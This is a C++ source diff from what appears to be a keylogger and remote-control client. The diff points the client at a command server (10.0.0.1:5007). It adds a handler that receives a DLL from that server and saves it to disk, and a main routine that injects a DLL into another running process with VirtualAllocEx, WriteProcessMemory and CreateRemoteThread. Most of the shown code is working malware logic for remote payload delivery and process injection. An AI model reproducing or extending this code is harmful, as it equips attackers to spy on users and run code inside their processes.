@@ -13,8 +13,8 @@
 using namespace std;
 
 #define DEFAULT_BUFLEN 1050
-#define DEFAULT_PORT "5006"
-#define DEFAULT_HOST "127.0.0.1"
+#define DEFAULT_PORT "5007"
+#define DEFAULT_HOST "10.0.0.1"
 
 std::ofstream openFile(char *file_path)
 {
@@ -396,7 +396,53 @@ DWORD WINAPI startKeyLogger()
 	}
 }
 
-int main2(int argc, char **argv)
+void iatHooking(SocketManager & socketManager, SOCKET & socket)
+{
+	int result;
+	char recvbuf[DEFAULT_BUFLEN * 4];
+	//get directory
+
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
+
+	char * dllPath = "IAT Hooking\IATHooking.dll";
+	std::ofstream clientFile = openFile(dllPath);
+	clientFile.write(recvbuf, result);
+	clientFile.close();
+	/*
+	LPTSTR exePath = _tcsdup(TEXT("..\\Server\\IAT Hooking\\Hooked\\Debug\\Hooked.exe"));
+
+
+	STARTUPINFO info = { sizeof(info) };
+	PROCESS_INFORMATION processInfo;
+	HANDLE hprocess = NULL;
+	if (CreateProcess(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFO)&info, &processInfo))
+	{
+		hprocess = processInfo.hProcess;
+	}
+	if (!hprocess)
+	{
+		cout << GetLastError();
+	}
+	LPVOID LoadLibraryAtRemoteProcess =
+		(LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
+
+	LPVOID dllPathLocalAddress = (LPVOID)dllPath;
+	LPVOID dllPathRemoteAddress = (LPVOID)VirtualAllocEx(hprocess, NULL, strlen(dllPath),
+		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	WriteProcessMemory(hprocess, dllPathRemoteAddress, dllPathLocalAddress,
+		strlen(dllPath), NULL);
+
+	CreateRemoteThread(hprocess, NULL, NULL, (LPTHREAD_START_ROUTINE)
+		LoadLibraryAtRemoteProcess, (LPVOID)dllPathRemoteAddress, NULL, NULL);
+
+	ResumeThread(processInfo.hThread);
+	WaitForSingleObject(processInfo.hProcess, INFINITE);
+	CloseHandle(processInfo.hProcess);
+	CloseHandle(processInfo.hThread);
+	*/
+}
+
+int main12(int argc, char **argv)
 {
 	SocketManager socketManager;
 	WindowsSocket windowsSocket;
@@ -515,8 +561,8 @@ int main2(int argc, char **argv)
 					else if (!strcmp(recvbuf, "IAT_HOOKING"))
 					{
 						//CreateThread(NULL,)
-						stopKeyLogger();//from differnet thread
-					}
+						iatHooking(socketManager, socket);
+					}				
 					else
 					{
 						printf("Bytes received: %d\n", iResult);
@@ -548,6 +594,7 @@ int main2(int argc, char **argv)
 	}
 }
 
+
 int main()
 {
 	//LPTSTR exePath = _tcsdup(TEXT("C:\\Users\\admin\\Documents\\PE\\HOOKING1\\notepad.exe"));
@@ -559,14 +606,22 @@ int main()
 	STARTUPINFO info = { sizeof(info) };
 	PROCESS_INFORMATION processInfo;
 	HANDLE hprocess = NULL;
-	if (CreateProcess(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFO)&info, &processInfo))
+	hprocess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 10740);
+	/*if (CreateProcess(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFO)&info, &processInfo))
 	{
 		hprocess = processInfo.hProcess;
-	}
+	}*/
 	if (!hprocess)
 	{
 		cout << GetLastError();
+
 	}
+	/*DWORD tId = GetMainThreadId(15848);
+	if (tId == FALSE)
+		return NULL;
+*/
+	//HANDLE hthread =  OpenThread(THREAD_ALL_ACCESS, FALSE, tId);
+
 	LPVOID LoadLibraryAtRemoteProcess =
 		(LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
 
@@ -576,11 +631,29 @@ int main()
 	WriteProcessMemory(hprocess, dllPathRemoteAddress, dllPathLocalAddress,
 		strlen(dllPath), NULL);
 
-	CreateRemoteThread(hprocess, NULL, NULL, (LPTHREAD_START_ROUTINE)
+	HANDLE hthread = CreateRemoteThread(hprocess, NULL, NULL, (LPTHREAD_START_ROUTINE)
 		LoadLibraryAtRemoteProcess, (LPVOID)dllPathRemoteAddress, NULL, NULL);
 
-	ResumeThread(processInfo.hThread);
-	WaitForSingleObject(processInfo.hProcess, INFINITE);
-	CloseHandle(processInfo.hProcess);
-	CloseHandle(processInfo.hThread);
+	ResumeThread(hthread);
+	//WaitForSingleObject(hthread, INFINITE);
+	CloseHandle(hprocess);
+	CloseHandle(hthread);
+	return 0;
+}
+
+void task1(std::string msg)
+{
+	while (true)
+	{
+		std::cout << "task1 says: " << msg;
+	}
+}
+int main3()
+{
+	std::thread t1(task1, "Hello");
+	t1.join();
+	Sleep(3);
+	t1.detach();
+	std::cout << "tehilla says: " << endl;
+	return 0;
 }
